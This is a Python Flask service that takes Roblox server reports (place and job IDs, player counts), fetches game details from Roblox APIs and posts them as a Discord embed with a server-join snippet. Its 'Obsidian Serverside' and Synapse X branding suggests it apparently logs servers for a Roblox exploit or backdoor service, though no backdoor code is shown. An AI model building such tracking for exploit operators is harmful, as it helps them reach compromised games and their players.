import os
import requests
import threading
import time
import logging
from flask import Flask, request, jsonify

# Настройка логирования для вывода в консоль Render
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

# URL-адреса API Roblox
UNIVERSE_API = "https://apis.roblox.com/universes/v1/places/{}/universe"
GAMES_API = "https://games.roblox.com/v1/games?universeIds={}"
VOTES_API = "https://games.roblox.com/v1/games/votes?universeIds={}"
THUMBNAIL_API = "https://thumbnails.roblox.com/v1/games/icons?universeIds={}&size=256x256&format=Png&isCircular=false"

def format_number(n):
    """Форматирует число, добавляя запятые в качестве разделителей."""
    if isinstance(n, (int, float)):
        return f"{n:,}"
    return "N/A"

def keep_alive():
    """Отправляет запрос каждые 10 минут, чтобы сервис не "засыпал" на Render."""
    while True:
        time.sleep(600)  # 10 минут
        try:
            render_app_url = os.environ.get('RENDER_EXTERNAL_URL')
            if render_app_url:
                logging.info("Keep-alive: отправляю пинг...")
                requests.get(render_app_url, timeout=15)
        except requests.RequestException as e:
            logging.error(f"Keep-alive: не удалось отправить пинг: {e}")

@app.route('/')
def home():
    """Простой маршрут для проверки работы и для keep_alive."""
    return "Сервер работает!", 200

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    logging.info("Получен новый запрос на webhook...")
    try:
        data = request.json
        place_id = data.get('placeId')
        job_id = data.get('jobId')
        player_count = data.get('playerCount')
        max_players = data.get('maxPlayers')
        discord_webhook_url = data.get('discordWebhookUrl')

        if not all([place_id, job_id, discord_webhook_url]):
            logging.error(f"Ошибка валидации: отсутствуют обязательные данные. Получено: {data}")
            return jsonify({"error": "Missing required data"}), 400

        # --- Шаг 1: Получение Universe ID ---
        try:
            universe_id_res = requests.get(UNIVERSE_API.format(place_id), timeout=10)
            universe_id_res.raise_for_status()
            universe_id = universe_id_res.json().get('universeId')
            if not universe_id:
                logging.error(f"Не удалось найти Universe ID для Place ID: {place_id}")
                return jsonify({"error": "Could not find Universe ID"}), 404
            logging.info(f"Успешно получен Universe ID: {universe_id}")
        except requests.RequestException as e:
            logging.error(f"Ошибка при запросе Universe ID: {e}")
            return jsonify({"error": "Failed to fetch Universe ID"}), 502

        # --- Шаг 2: Получение всех деталей игры ---
        details, votes, thumbnail_url = {}, {}, None
        
        try:
            game_details_res = requests.get(GAMES_API.format(universe_id), timeout=10)
            game_votes_res = requests.get(VOTES_API.format(universe_id), timeout=10)
            thumbnail_res = requests.get(THUMBNAIL_API.format(universe_id), timeout=10)
            
            game_details_res.raise_for_status()
            game_votes_res.raise_for_status()
            thumbnail_res.raise_for_status()
            
            details = game_details_res.json()['data'][0]
            votes = game_votes_res.json()['data'][0]
            thumbnail_url = thumbnail_res.json()['data'][0]['imageUrl']
            logging.info("Успешно получены все детали игры.")
        except (requests.RequestException, IndexError, KeyError) as e:
            logging.error(f"Ошибка при получении деталей игры: {e}")
            return jsonify({"error": "Failed to fetch all game details"}), 502

        # --- Шаг 3: Сборка эмбеда для Discord (ТВОЯ ВЕРСИЯ) ---
        logging.info("Начинаю сборку эмбеда...")
        game_name = details.get('name', 'N/A')
        price = details.get('price')
        price_str = "Free" if price is None or price == 0 else f"{price} Robux"
        js_code = f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, \"{job_id}\");\n```"
        
        # --- НАЧАЛО ТВОЕГО EMBED ---
        payload = {
            "embeds": [{
                "author": {
                    "name": "Obsidian Project",
                    "icon_url": "https://static.wikia.nocookie.net/logopedia/images/a/aa/Synapse_X_%28Icon%29.svg/revision/latest/scale-to-width-down/250?cb=20221129133252"
                },
                "title": "Obsidian Serverside",
                "color": 11290873, # Purple
                "thumbnail": {
                    "url": thumbnail_url
                },
                "fields": [
                    {"name": "Game", "value": f"[{game_name}](https://www.roblox.com/games/{place_id})", "inline": True},
                    {"name": "Active Players", "value": format_number(details.get('playing')), "inline": True},
                    {"name": "Players In Server", "value": f"{player_count}/{max_players}", "inline": True},
                    {"name": "Game Visits", "value": format_number(details.get('visits')), "inline": True},
                    {"name": "Game Version", "value": str(details.get('placeVersion', 'N/A')), "inline": True},
                    {"name": "Creator Name", "value": details.get('creator', {}).get('name', 'N/A'), "inline": True},
                    {"name": "Creator ID", "value": str(details.get('creator', {}).get('id', 'N/A')), "inline": True},
                    {"name": "Price", "value": price_str, "inline": True},
                    {"name": "Universe ID", "value": str(universe_id), "inline": True},
                    {"name": "Favorites", "value": format_number(details.get('favoritedCount')), "inline": True},
                    {"name": "Likes", "value": format_number(votes.get('upVotes')), "inline": True},
                    {"name": "Dislikes", "value": format_number(votes.get('downVotes')), "inline": True},
                    {"name": "Genre", "value": details.get('genre', 'N/A'), "inline": True},
                    {"name": "Voice Chat", "value": str(details.get('voiceEnabled', 'N/A')), "inline": True},
                    {"name": "Created", "value": f"`{details.get('created', 'N/A')}`", "inline": True},
                    {"name": "Updated", "value": f"`{details.get('updated', 'N/A')}`", "inline": True},
                    {"name": "JavaScript", "value": js_code, "inline": False},
                ],
                "footer": { "text": "Protected by Rewq" }
            }]
        }
        # --- КОНЕЦ ТВОЕГО EMBED ---
        logging.info("Эмбед успешно собран.")

        # --- Шаг 4: Отправка в Discord ---
        try:
            response = requests.post(discord_webhook_url, json=payload, timeout=15)
            response.raise_for_status() 
            logging.info(f"Вебхук успешно отправлен в Discord со статусом {response.status_code}.")
            return jsonify({"success": "Webhook sent!"}), 200
        except requests.RequestException as e:
            logging.error(f"Ошибка при отправке вебхука в Discord: {e}")
            return jsonify({"error": "Failed to send webhook to Discord"}), 502

    except Exception as e:
        logging.critical(f"Произошла непредвиденная ошибка в handle_webhook: {e}", exc_info=True)
        return jsonify({"error": "An internal server error occurred"}), 500

if __name__ == '__main__':
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
